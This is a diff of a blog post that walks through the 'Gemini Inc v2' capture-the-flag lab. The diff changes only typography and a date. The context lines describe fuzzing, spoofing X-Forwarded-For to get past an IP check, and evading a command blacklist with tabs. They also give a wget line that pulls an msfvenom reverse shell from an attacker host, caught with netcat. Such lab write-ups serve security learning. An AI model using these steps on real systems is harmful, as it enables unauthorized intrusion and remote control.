@@ -1,7 +1,7 @@
 ---
 layout: post
 date: 2018-06-03 17:25:02 +0000
-last_modified_at: 2018-06-23 20:56:59 +0000
+last_modified_at: 2018-06-27 11:02:14 +0000
 title: "Gemini Inc: v2 Walkthrough"
 subtitle: "Double Trouble"
 category: Walkthrough
@@ -51,7 +51,7 @@ PORT   STATE SERVICE REASON         VERSION
 
 ### Directory/File Enumeration
 
-Since the site is more secure now, let's take a different approach this time &mdash; fuzzing. The tool for such a job is `wfuzz`. It's fast, comes with high quality wordlists, and easy-to-use filters for response code, number of lines, words, and even characters.
+Since the site is more secure now, let's take a different approach this time—fuzzing. The tool for such a job is `wfuzz`. It's fast, comes with high quality wordlists, and easy-to-use filters for response code, number of lines, words, and even characters.
 
 ```
 # wfuzz -w /usr/share/wfuzz/wordlist/general/megabeast.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt --hc 404 -t 50 http://192.168.10.130/FUZZFUZ2Z
@@ -87,7 +87,7 @@ It's obvious there's a user registration and activation process. Look at the res
 
 ![0.z46xpgzawqe](/assets/images/posts/gemini-inc-v2-walkthrough/0.z46xpgzawqe.png)
 
-Let's register an account with the site using everything `admin` — even the password.
+Let's register an account with the site using everything `admin`—even the password.
 
 ![0.wxincvw3tgq](/assets/images/posts/gemini-inc-v2-walkthrough/0.wxincvw3tgq.png)
 
@@ -115,7 +115,7 @@ demo4    (u=13)
 admin    (u=14)
 ```
 
-Now that we know the user ID of the newly registered account, let's proceed to activate it. Before we do that, know this &mdash; any invalid code will result in a `403 INVALID VALUE` response from the server.
+Now that we know the user ID of the newly registered account, let's proceed to activate it. Before we do that, know this—any invalid code will result in a `403 INVALID VALUE` response from the server.
 
 ![0.7qgwlhrfd8u](/assets/images/posts/gemini-inc-v2-walkthrough/0.7qgwlhrfd8u.png)
 
@@ -220,7 +220,7 @@ Clicking on either **General Settings** or **Execute Command** shows nothing. I 
 
 ![0.iia4qhz8ici](/assets/images/posts/gemini-inc-v2-walkthrough/0.iia4qhz8ici.png)
 
-There's a Burp extension &mdash; **Bypass WAF**, that can help us do this seamlessly. Essentially, the extension adds custom headers such as `X-Forwarded-For: 127.0.0.1` to every HTTP request made through Burp. The instruction to add the extension is beyond the scope of this walkthrough.
+There's a Burp extension—**Bypass WAF**, that can help us do this seamlessly. Essentially, the extension adds custom headers such as `X-Forwarded-For: 127.0.0.1` to every HTTP request made through Burp. The instruction to add the extension is beyond the scope of this walkthrough.
 
 Suffice to say, after adding the custom headers, I'm able to display **General Settings** and **Execute Command**.
 
@@ -228,7 +228,7 @@ Suffice to say, after adding the custom headers, I'm able to display **General S
 
 ![0.zjtyxnja1w](/assets/images/posts/gemini-inc-v2-walkthrough/0.zjtyxnja1w.png)
 
-Something strikes me as familiar when I look at the HTML source of `/new-groups.php` — the **Execute Command** page.
+Something strikes me as familiar when I look at the HTML source of `/new-groups.php`—the **Execute Command** page.
 
 ![0.747hclxg2ig](/assets/images/posts/gemini-inc-v2-walkthrough/0.747hclxg2ig.png)
 
@@ -238,7 +238,7 @@ Recall the file `blacklist.txt` uncovered during fuzzing? It had a test for ille
 
 ### Execute Command
 
-The most common shell in Linux distributions is `bash` and it uses whitespace as the separator between the command, option(s), and argument(s). For example, in this command execution —  `wget -O /tmp/rev 192.168.10.128/rev`, the space character is the separator between the command `wget`, the option `-O`, and the arguments `/tmp/rev` and `192.168.10.128/rev`. In fact, `bash` defines space, tab, and the newline character as whitespace. In other words, we can substitute the space character (`\x20`) with the tab character (`\x09`) in the previous example and it would still execute.
+The most common shell in Linux distributions is `bash` and it uses whitespace as the separator between the command, option(s), and argument(s). For example, in this command execution— `wget -O /tmp/rev 192.168.10.128/rev`, the space character is the separator between the command `wget`, the option `-O`, and the arguments `/tmp/rev` and `192.168.10.128/rev`. In fact, `bash` defines space, tab, and the newline character as whitespace. In other words, we can substitute the space character (`\x20`) with the tab character (`\x09`) in the previous example and it would still execute.
 
 With this in mind, let's generate a reverse shell with `msfvenom` and name it as `rev`; host it with Python's `SimpleHTTPServer`, and execute `wget -O /tmp/rev 192.168.10.128/rev` in the **Execute Command** page to transfer it over, replacing the space character with the tab character. We then execute `/tmp/rev` in the **Execute Command** page to launch the reverse shell. We also need to get the `netcat` listener ready to catch the reverse shell.
 
